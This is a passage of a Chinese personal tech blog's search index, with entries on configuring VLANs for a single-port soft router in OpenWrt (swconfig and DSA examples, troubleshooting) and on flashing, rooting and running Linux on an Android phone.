on\u00a0<code>eth1</code>. When any internal software routing decision sends the packet to the software\u00a0VLAN, it leaves the respective interface (<code>eth1</code>\u00a0in our example) with the\u00a0VLAN\u00a0tag present and\u00a0VLAN\u00a0ID set to the number corresponding to the interface name (<code>2</code>\u00a0in our example on\u00a0<code>eth1.2</code>). if the incoming packet arrives to the interface with software VLANs (incoming packet to\u00a0<code>eth1</code>) and has a\u00a0VLAN\u00a0ID tag set, it appears on the respective software-VLAN-interface instead (VLAN\u00a0ID 2 tag arrives on\u00a0<code>eth1.2</code>) \u2013 if it exists in the configuration! Otherwise the packet is dropped. Non-tagged packets are delivered to non-VLAN\u00a0interface (<code>eth1</code>) as usual.</p> <p>\u5f53\u628a non-VLAN \u63a5\u53e3\u548c VLAN \u63a5\u53e3\u6865\u63a5\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u589e\u52a0\u548c\u5220\u9664 tag</p> <p>When you bridge non-VLAN\u00a0and\u00a0VLAN\u00a0interfaces together, the system takes care about adding\u00a0VLAN\u00a0ID when sending packet from non-VLAN\u00a0to\u00a0VLAN\u00a0interface, and it automatically removes the\u00a0VLAN\u00a0ID when sending packet from\u00a0VLAN\u00a0interface to non-VLAN\u00a0one.</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#dsa-\u8bbe\u7f6e","title":"DSA \u8bbe\u7f6e","text":"<p>Distributed Switch Architecture(DSA) \u662f linux kernel \u5bf9\u7f51\u7edc\u67b6\u6784\u7684\u4e00\u4e2a\u8c03\u6574\uff0copenwrt \u4ece 21 \u7684\u7248\u672c\u5f00\u59cb\u4f7f\u7528\u8be5\u67b6\u6784\u3002 \u53c2\u8003\uff1a</p> <ul> <li>\u63a8\u8350\u4ed4\u7ec6\u89c2\u770b\uff1aVLANs in OpenWrt 21 - YouTube</li> <li>\u5b98\u65b9 wiki\uff1a[OpenWrt Wiki] DSA Mini-Tutorial</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#dsa-vs-swconfig","title":"DSA vs swconfig","text":"<p>openwrt 19 \u4ee5\u524d\u7248\u672c\u4f7f\u7528 swconfig\uff0c\u4ece 21 \u7684\u7248\u672c\u5f00\u59cb\u4f7f\u7528 DSA\u3002</p> <p>\u533a\u522b\u603b\u7ed3\uff1a</p> <ul> <li>21 \u53ef\u4ee5\u663e\u5f0f\u5b9a\u4e49 vlan device\uff08802.1q\uff09\uff0c19 \u5219\u662f\u5728 interface \u901a\u8fc7\u9009\u62e9 device \u65f6\u624b\u52a8\u6dfb\u52a0\u540e\u7f00\uff0c\u9690\u5f0f\u914d\u7f6e\u3002</li> <li>\u6307\u5b9a\u7aef\u53e3\u6807\u7b7e\u65b9\u5f0f<ul> <li>19 \u4e2d\uff0c\u4e13\u95e8\u7684 switch \u9875\u9762\uff0c\u6307\u5b9a\u4e0d\u540c\u7aef\u53e3\u5982\u4f55\u6253\u6807\u7b7e</li> <li>21 \u4e2d\uff0c\u6bcf\u4e2a port \u53d8\u6210\u5355\u72ec\u4e00\u4e2a device\uff08\u5982 lan1, lan2, wan\uff09\u3002\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a bridge \u6dfb\u52a0 lan1, lan2, wan\uff0c\u7136\u540e\u901a\u8fc7 bridge vlan filtering \u6765\u6307\u5b9a\u4e0d\u540c\u7aef\u53e3\u7684\u6253\u6807\u7b7e\u65b9\u5f0f\u3002</li> </ul> </li> </ul> <p>21 \u603b\u7ed3</p> <ul> <li>define VLAN on the bridge</li> <li>tag and untag on the bridge</li> <li>attach wifi to the interface</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#ingress-vs-egress-tagged-vs-untagged-\u542b\u4e49","title":"ingress vs egress, tagged vs untagged \u542b\u4e49","text":"<ul> <li>egress tagged\uff1a\u53d1\u5f80 VLAN 100 \u7684\u5305\uff0c\u4f1a\u4ece\u6307\u5b9a\u7aef\u53e3\u53d1\u51fa\uff0c\u5e76\u4e14\u5728\u4ee5\u592a\u7f51\u5e27\u4e2d\u63d2\u5165 tag\u3002\u9002\u7528\u4e8e\u5bf9\u9762\u4e5f\u662f vlan-aware \u8bbe\u5907</li> <li>egress untagged: \u53d1\u5f80 VLAN 100 \u7684\u5305\uff0c\u4f1a\u4ece\u6307\u5b9a\u7aef\u53e3\u53d1\u51fa\uff0c\u5e76\u4e14\u5728\u4ee5\u592a\u7f51\u5e27\u4e2d\u79fb\u9664 tag\u3002\u9002\u7528\u4e8e\u8fde\u63a5\u666e\u901a\u8bbe\u5907\uff0c\u4e00\u4e2a\u7aef\u53e3\u53ea\u80fd\u5bf9\u5e94\u4e00\u4e2a untagged vlan\u3002</li> <li>\u5bf9\u4e8e\u5165\u7ad9\u7684\u60c5\u51b5\uff0c\u5982\u679c\u5305\u6709 tag\uff0c\u5219\u76f4\u63a5\u53d1\u5f80\u5bf9\u5e94\u7684 vlan\u3002\u5982\u679c\u662f untagged \u7684\uff0c\u5219\u6dfb\u52a0 PVID\uff0c\u53d1\u5f80\u5bf9\u5e94 vlan\u3002</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#swconfig-\u914d\u7f6e\u5b9e\u4f8b-p2w","title":"swconfig \u914d\u7f6e\u5b9e\u4f8b (p2w)","text":"<p>\u5e76\u975e 21 \u540e\u7684\u7248\u672c\u90fd\u4f7f\u7528\u4e86 DSA\uff0c\u8fd9\u91cc p2w \u4f7f\u7528\u7684 op \u7248\u672c\u4e3a 22.03\uff0c\u4ecd\u7136\u6709 switch \u9875\u9762\u3002</p> <p>\u8bbe\u7f6e vlan \u7684\u8fc7\u7a0b\u4e3a</p> <ul> <li>\u5728 switch \u4e2d\u8bbe\u7f6e\u7aef\u53e3 tagged, untagged\uff0c\u89c1\u56fe 1<ul> <li>\u56fe\u4e2d vlan100 \u7684 CPU \u8bbe\u7f6e\u4e86 off\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u4e0d\u9700\u8981\u5904\u7406\u8be5\u90e8\u5206\u6d41\u91cf\uff08\u8be5\u90e8\u5206\u662f\u5b66\u6821\u5230\u8f6f\u8def\u7531\u865a\u62df\u94fe\u8def\uff09\u3002\u8fd9\u6837\u8bbe\u7f6e\u4e0d\u4f1a\u4ea7\u751f eth0.100 \u7684\u8bbe\u5907\u3002</li> </ul> </li> <li>\u56fe 2 \u4e3a\u9690\u5f0f\u4ea7\u751f\u7684 vlan device</li> <li>\u6dfb\u52a0 interface\uff0c\u6307\u5b9a\u4f7f\u7528\u7684 vlan\u3002\u56fe 3 mgr \u6307\u5b9a\u4e86 eth0.99\uff0c\u800c lan \u6307\u5b9a\u7684 br-lan \u8fde\u63a5\u4e86 eth0.200 \u56fe 1  \u56fe 2  \u56fe 3  \u56fe 4 </li> </ul> <p>\u4ece\u914d\u7f6e\u6587\u4ef6\u6765\u770b\uff0c\u901a\u8fc7 switch_vlan \u6307\u5b9a\u4e86\u4e0d\u540c\u7aef\u53e3\u5982\u4f55\u6253\u4e0a tag</p> <pre><code>config switch\n        option name 'switch0'\n        option reset '1'\n        option enable_vlan '1'\n\nconfig switch_vlan\n        option device 'switch0'\n        option vlan '1'\n        option vid '100'\n        option ports '4 1t'\n        option description '\u5b66\u6821\u5230\u5355\u53e3\u8f6f\u8def\u7531'\n\nconfig switch_vlan\n        option device 'switch0'\n        option vlan '2'\n        option vid '200'\n        option ports '0t 3 1t'\n        option description '\u8f6f\u8def\u7531\u5230LAN'\n\nconfig switch_vlan\n        option device 'switch0'\n        option vlan '3'\n        option vid '99'\n        option description 'LAN3\u7528\u4e8e\u7ba1\u7406'\n        option ports '0t 2'\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#dsa-\u914d\u7f6e\u5b9e\u4f8b-ax6s","title":"DSA \u914d\u7f6e\u5b9e\u4f8b (ax6s)","text":"<p>ax6s \u6709\u56db\u4e2a\u7aef\u53e3</p> <ul> <li>\u56fe 1\uff0c\u5c06\u6240\u6709 lan \u53e3\u6dfb\u52a0\u5230 br-lan\uff08\u8fd9\u91cc\u5176\u5b9e wan \u4e5f\u53ef\u4ee5\u6dfb\u52a0\u8fdb\u6765\uff09</li> <li>\u56fe 2\uff0c\u8bbe\u7f6e\u7aef\u53e3\u6807\u7b7e</li> <li>\u56fe 3\uff0c\u81ea\u52a8\u751f\u6210\u4e86 vlan \u8bbe\u5907\uff0c\u4f46\u8fd9\u6b21\u662f\u5728 br-lan \u4e0a\u751f\u6210\u7684</li> <li>\u56fe 4\uff0c\u521b\u5efa\u63a5\u53e3\uff0c\u6307\u5b9a\u4e0d\u540c vlan \u8bbe\u5907<ul> <li>\u8fd9\u91cc wan \u53e3\u4e13\u95e8\u7528\u4e8e\u7ba1\u7406 </li> </ul> </li> </ul> <p></p> <p></p> <p></p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#lxc-openwrt-dnsmasq","title":"lxc openwrt dnsmasq","text":"<ul> <li>lxc \u521b\u5efa openwrt \u5bb9\u5668\uff0c\u521a\u5f00\u59cb\u4e3a\u624b\u52a8\u521b\u5efa\u955c\u50cf\u3002\u7ed3\u679c\u542f\u52a8\u5bb9\u5668\u540e\u53d1\u73b0 openwrt \u5185\u65e0\u53d1\u4e0a\u7f51\uff0c\u8fdb\u4e00\u6b65\u53d1\u73b0\u662f dnsmasq \u6ca1\u6709\u542f\u52a8\u5bfc\u81f4\u57df\u540d\u89e3\u6790\u4e0d\u4e86\u3002<ul> <li>\u6309\u7167 openwrt \u8bba\u575b\u4e2d\u7684\u65b9\u6cd5\u6ce8\u91ca\u6389 dnsmasq \u7684\u542f\u52a8\u811a\u672c\u4e2d\u7684\u90e8\u5206\u884c\uff0c\u95ee\u9898\u89e3\u51b3\u3002Procd jail not work in lxc, dnsmasq fail to start - For Developers - OpenWrt Forum</li> <li>\u73b0\u5728 lxc \u6709 openwrt \u5b98\u65b9\u955c\u50cf\uff0c\u6ca1\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f46\u662f\u5176 lan interface \u914d\u7f6e\u7528\u7684\u8fd8\u662f ifname\uff0copenwrt luci \u4f1a\u63d0\u793a\u66f4\u65b0\u3002</li> </ul> </li> </ul> <p>log \u662f\u4e0d\u662f\u76f8\u5173</p> <p>[Tue Jul 25 17:55:09 2023] audit: type=1400 audit(1690278912.535:306): apparmor=\"DENIED\" operation=\"mount\" info=\"failed type match\" error=-13 profile=\"lxd-op1_\" name=\"/tmp/ujail-LFABnj/bin/sh\" pid=920178 comm=\"ntpd\" flags=\"ro, remount, bind\"</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#p2w-\u7684-wan-\u53e3\u5751","title":"p2w \u7684 wan \u53e3\u5751","text":"<p>wan \u53e3\u7528\u4e8e\u7ba1\u7406\u600e\u4e48\u90fd\u4e0d\u884c\u3002\u4e00\u4fee\u6539 swtich \u83dc\u5355\uff0c\u9a6c\u4e0a\u5931\u8054\u3002\u4f7f\u7528 lan \u53e3\u7ba1\u7406\u6210\u529f</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#wifi-\u6302\u8f7d\u5230\u7f51\u6865\u4e0a\u624d\u80fd\u83b7\u5f97-dhcp-\u5730\u5740","title":"wifi \u6302\u8f7d\u5230\u7f51\u6865\u4e0a\u624d\u80fd\u83b7\u5f97 dhcp \u5730\u5740","text":"<ul> <li>eth0.200 \u7528\u4e8e lan\uff0clan \u8bbe\u7f6e dhcp client\uff0c\u4f46\u662f p2w \u83b7\u5f97\u5230\u4e86 ip\uff0c\u8fde\u63a5 wifi \u7684\u7b14\u8bb0\u672c\u83b7\u5f97\u4e0d\u4e86\u3002\u521b\u5efa\u4e00\u4e2a\u7f51\u6865 br-lan\uff0c\u7136\u540e\u6dfb\u52a0 eth0.200 \u540e\u6210\u529f\u3002</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#guest-wifi-\u65e0\u6cd5\u4e0a\u7f51","title":"guest wifi \u65e0\u6cd5\u4e0a\u7f51","text":"<p>\u5728 ax6s \u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a guest wifi\uff0c\u4f7f\u7528\u5355\u72ec\u7684 vlan\u3002\u6700\u7ec8\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p> <p></p> <p>\u4f46\u662f\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4e0d\u77e5\u4e3a\u4f55 guest \u663e\u5f0f\u8bbe\u5907\u4e0d\u5b58\u5728\uff0c\u4e8e\u662f\u624b\u52a8\u6dfb\u52a0\u4e86 802.1q \u8bbe\u5907\uff0cvlan id \u624b\u52a8\u6307\u5b9a\u4e3a 201\u3002\u8c8c\u4f3c\u6ca1\u6709\u548c br-lan \u4e2d bridge vlan filtering \u81ea\u52a8\u521b\u5efa\u7684 802.1q \u4ea7\u751f\u51b2\u7a81\u3002\u4e8e\u662f\u8bbe\u5907\u4e0d\u5b58\u5728\u7684\u95ee\u9898\u89e3\u51b3\u4e86\u3002</p> <p>\u4f46\u662f guest \u4ecd\u7136\u65e0\u6cd5\u901a\u8fc7 dhcp \u83b7\u5f97 ip\u3002tianyi \u7684 br-guest \u4e5f\u65e0\u6cd5\u83b7\u5f97 ip \u5730\u5740\uff08\u5176\u4e2d 215 \u662f\u624b\u52a8\u6dfb\u52a0\u7684\uff0c234 \u662f\u540e\u9762\u6210\u529f\u540e\u81ea\u52a8\u83b7\u5f97\u7684\uff09\uff0ctcpdump -i br-guest \u53ef\u4ee5\u770b\u5230\u6709\u6765\u81ea ax6s guest \u63a5\u53e3\u7684 dhcp request\u3002</p> <p></p> <p>\u8fdb\u5165 op2\uff0c\u53d1\u73b0\u4e5f\u6ca1\u6709\u751f\u6210\u5bf9\u5e94\u8def\u7531\uff0c\u800c\u662f\u5168\u90e8\u8d70 192.168.36.1\uff08\u56fe\u4e2d\u7684 default \u548c 192.168.37.1 \u662f\u540e\u9762\u81ea\u52a8\u751f\u6210\u7684\uff09\uff0c\u4e8e\u662f\u624b\u52a8\u6dfb\u52a0\u4e86\u4e00\u6761 192.168.37.0/24 \u7684\u89c4\u5219\u3002</p> <pre><code>default via 192.168.36.1 dev br1 proto dhcp src 192.168.36.215 metric 100\ndefault via 192.168.37.1 dev br-guest proto dhcp src 192.168.37.234 metric 100\n\n192.168.37.0/24 dev br-guest proto kernel scope link src 192.168.37.215\n192.168.37.1 dev br-guest proto dhcp scope link src 192.168.37.234 metric 100\n</code></pre> <p>\u4f46\u662f\u6b64\u65f6 ax6s \u8fd8\u662f\u65e0\u6cd5 dhcp \u83b7\u5f97 ip\uff0c\u4e8e\u662f\u624b\u52a8\u6dfb\u52a0\u4e86\u4e00\u4e2a 37.180 \u7684\u5730\u5740\uff0c\u53d1\u73b0\u4ecd\u7136 ping \u4e0d\u901a 37.1 \u68c0\u67e5 op2\uff0c\u53d1\u73b0 guest \u65e0\u6cd5\u8bbf\u95ee\u8def\u7531\u5668\u81ea\u8eab\u56e0\u6b64\u65e0\u6cd5 ping\u3002\u4e8e\u662f\u5f00\u542f\u4e86 input\uff08\u4e4b\u540e\u53c8\u5173\u95ed\u4e86\uff0c\u6ca1\u95ee\u9898\uff09 </p> <p>\u6b64\u65f6\u53d1\u73b0 guest \u5df2\u7ecf\u53ef\u4ee5\u4e0a\u7f51\u4e86\u3002\u4e0d\u77e5\u9053\u4e0a\u9762\u6b65\u9aa4\u4e2d\u54ea\u4e00\u6b65\u5bfc\u81f4\u7684\u3002</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/","title":"\u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5 linux","text":"<p>\u5b89\u5353\u5237\u673a\u5e76\u5b89\u88c5 linux</p> <ul> <li>\u57fa\u7840\u6982\u5ff5\uff1aBL \u9501\uff0cBoot \u5206\u533a\uff0cRecovery \u5206\u533a\uff0cfastboot\uff1a\u73a9\u673a\u5fc5\u770b\uff01\u5e26\u4f60\u5165\u5751 Android \u5237\u673a\uff0c\u5c0f\u767d\u4e5f\u80fd\u770b\u61c2\u7684 ROOT \u57fa\u7840\u6307\u5357\u6765\u5566\uff01 - YouTube</li> </ul> <ul> <li>\u539f\u751f\u5b89\u5353\u6ce8\u610f\uff1a\u5199\u7ed9\u666e\u901a\u56fd\u5185\u7528\u6237\u7684\u539f\u751f Android \u73a9\u673a\u6ce8\u610f\u4e8b\u9879\u548c\u7981\u5fcc\u4e8b\u9879 - LetITFly BBS</li> <li>\u603b\u7ed3\u5404\u673a\u578b custom rom \u7684\u7f51\u7ad9CustomRomBay.org - xaga</li> <li>\u7c7b\u539f\u751f<ul> <li>Devices - PixelExperience</li> </ul> </li> </ul> <ul> <li>note11T pro<ul> <li>\u7ea2\u7c73 Note 11T Pro \u5237\u673a\u5206\u4eab\uff01\u56fd\u884c MIUI \u5237\u6b27\u7248 EEA \u65e0\u5751\u7248\u5b8c\u6574\u6559\u7a0b\u5206\u4eab\uff08\u9644\u4e00\u5468\u4f7f\u7528\u4f53\u9a8c\uff09 | \u6211\u4e0d\u662f\u5495\u5495\u9e3d (laoda.de)</li> <li>\u7ea2\u7c73 Note 11T Pro \u5237\u673a\u5206\u4eab\uff01\u56fd\u884c MIUI \u5237\u6b27\u7248 EEA \u65e0\u5751\u7248\u5b8c\u6574\u6559\u7a0b\u5206\u4eab\uff08\u9644\u4e00\u5468\u4f7f\u7528\u4f53\u9a8c\uff09_\u54d4\u54e9\u54d4\u54e9_bilibili</li> </ul> </li> </ul> <ul> <li>\u4ecb\u7ecd\u4e86 PixelExperience, LineageOS: \u5c0f\u7c73\u624b\u673a\u5237\u539f\u751f Android \u540e\u76f4\u63a5\u53d8 Google Pixel \u624b\u673a\uff0c\u4f53\u9a8c\u8d85\u68d2\uff01\u5f00\u6e90\u3001\u5b89\u5168\u3001\u4e1d\u6ed1 - YouTube</li> </ul> <p>\u5c0f\u7c73 note11t pro \u5404\u79cd\u65e0\u54cd\u5e94\uff1amiui14 \u4e00\u76f4\u63d0\u793a\u5e94\u7528\u6ca1\u6709\u54cd\u5e94 - \u6296\u97f3 (douyin.com)</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u5237\u673a","title":"\u5237\u673a","text":"","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"<ul> <li>\u4ec0\u4e48\u662f bootloader \u9501\uff1f<ul> <li>\u542f\u52a8\u6b65\u9aa4\uff1aSoC \u4e2d boot -&gt; bootloader -&gt; \u7cfb\u7edf</li> <li>\u53ea\u5141\u8bb8\u542f\u52a8\u7ecf\u8fc7\u7b7e\u540d\u7684\u7cfb\u7edf\u955c\u50cf\uff0c\u56e0\u6b64\u4e0d\u89e3\u9501\u65e0\u6cd5\u5237\u5176\u5b83\u7cfb\u7edf</li> </ul> </li> <li>fastboot vs recovery<ul> <li>recovery \u662f\u5355\u72ec\u4e00\u4e2a\u5206\u533a\uff0c\u5305\u542b\u4e00\u4e2a\u5c0f\u7684 linux \u7cfb\u7edf\uff0c\u624b\u673a\u5f15\u5bfc\u8fdb\u5165\u8be5\u7cfb\u7edf\u540e\u53ef\u4ee5\u8fdb\u884c\u5361\u5237</li> <li>fastboot\uff0c\u662f bootloader \u652f\u6301\u7684\u4e00\u79cd\u6a21\u5f0f\uff0c\u7528\u4e8e\u8fde\u63a5 PC\u3002\u8fde\u63a5\u540e\uff0c\u7535\u8111\u901a\u8fc7 fastboot \u53ef\u4ee5\u5bf9\u624b\u673a\u5206\u533a\u8fdb\u884c\u4fee\u6539\uff0c\u4ece\u800c\u8fdb\u884c\u7ebf\u5237<ul> <li>\u4e0d\u662f\u6240\u6709\u624b\u673a\u90fd\u652f\u6301 fastboot</li> </ul> </li> </ul> </li> <li>\u5361\u5237\u5305 vs \u7ebf\u5237\u5305\uff1a<ul> <li>\u5361\u5237\u5305\uff1azip \u7ed3\u5c3e\uff0c\u7528\u4e8e\u76f8\u5f53\u4e8e\u7cfb\u7edf\u66f4\u65b0\u6587\u4ef6\u3002\u5927\u5c0f\u6bd4\u7ebf\u5237\u5305\u5c0f\uff082.2 \u548c 3.6 G)</li> <li>\u7ebf\u5237\u5305\uff1a\u5b8c\u6574\u7cfb\u7edf\u955c\u50cf</li> <li>\u6d4b\u8bd5\u53d1\u73b0\u4e8c\u8005\u90fd\u5305\u542b boot.img \u4e14\u662f\u76f8\u540c\u6587\u4ef6</li> </ul> </li> </ul>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#root-\u6559\u7a0b-magisk","title":"root \u6559\u7a0b (magisk)","text":"<p>\u5c0f\u7c73\u4f7f\u7528\u5f00\u53d1\u677f\u7cfb\u7edf\uff0c\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97 root\uff0c\u4f46\u662f\u8be5 root \u6743\u9650\u4e0d\u5b8c\u6574\u3002 \u4f7f\u7528 Magisk \u83b7\u5f97 root \u6743\u9650\u597d\u5904\u662f\uff0c\u53ef\u4ee5\u968f\u65f6\u542f\u7528\u5173\u95ed root\u3002</p> <p>Magisk \u5b89\u88c5\u6559\u7a0b - Magisk \u4e2d\u6587\u7f51 (magiskcn.com)</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#adb-\u8c03\u8bd5","title":"adb \u8c03\u8bd5","text":"<ul> <li>google \u6559\u7a0b\uff1aAndroid \u8c03\u8bd5\u6865 (adb) \u00a0|\u00a0 Android \u5f00\u53d1\u8005 \u00a0|\u00a0 Android Developers</li> </ul>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u5b89\u88c5-linux","title":"\u5b89\u88c5 linux","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>Deploy Linux on any rooted Android device with Linux Deploy | My Take on Tech (my-take-on.tech)</li> </ul> <ul> <li>\u9700\u8981 root<ul> <li>linuxdeploy: meefik/linuxdeploy: Install and run GNU/Linux on Android (github.com)</li> </ul> </li> </ul>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#linuxdeploy-\u4fdd\u6301\u5f00\u542f","title":"linuxdeploy \u4fdd\u6301\u5f00\u542f","text":"<p>\u5c0f\u7c73\u624b\u673a\u5f00\u542f\u8d85\u7ea7\u7701\u7535\uff0c\u5b9e\u6d4b\u5f85\u673a\u4e00\u5929\u7535\u91cf\u4ece 85% \u964d\u4f4e\u5230 82% \u5de6\u53f3\u3002\u4f46\u662f\u5f00\u542f\u8d85\u7ea7\u7701\u7535\u540e\uff0c\u867d\u7136 l \u53ef\u4ee5 ssh \u767b\u5f55 inuxdeploy\uff0c\u4f46\u662f\u65e0\u6cd5 ping \u7f51\u7edc\u3002\u5e76\u4e14\u8fd0\u884c\u7684\u7a0b\u5e8f\u4f1a\u975e\u5e38\u6162\uff0c\u53ea\u6709\u4e0d\u65ad\u56de\u8f66\u624d\u4f1a\u8fd0\u884c\u3002</p> <p>\u5728\u8bbe\u7f6e\u4e2d\u627e\u5230\u9501\u5b9a Wi-Fi\u3001CPU \u5524\u9192\u52fe\u9009\u5373\u53ef\u3002</p>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#root-\u540e\u8f6f\u4ef6","title":"root \u540e\u8f6f\u4ef6","text":"","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#\u7981\u7528\u7cfb\u7edf\u670d\u52a1","title":"\u7981\u7528\u7cfb\u7edf\u670d\u52a1","text":"<p>\u53ea\u9700\u8981 USB \u8c03\u8bd5\u6743\u9650\uff0c\u65e0\u9700 root</p> <ul> <li>0x192/universal-android-debloater: Cross-platform GUI written in Rust using ADB to debloat non-rooted android devices. Improve your privacy, the security and battery life of your device. (github.com)</li> </ul>","tags":["\u5237\u673a","linuxdeploy"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/12/04/2022-12-04-%E5%AE%89%E5%8D%93%E5%88%B7%E6%9C%BA%E5%B9%B6%E5%AE%89%E8%A3%85linux/#adb-\u76f8\u5173","title":"adb 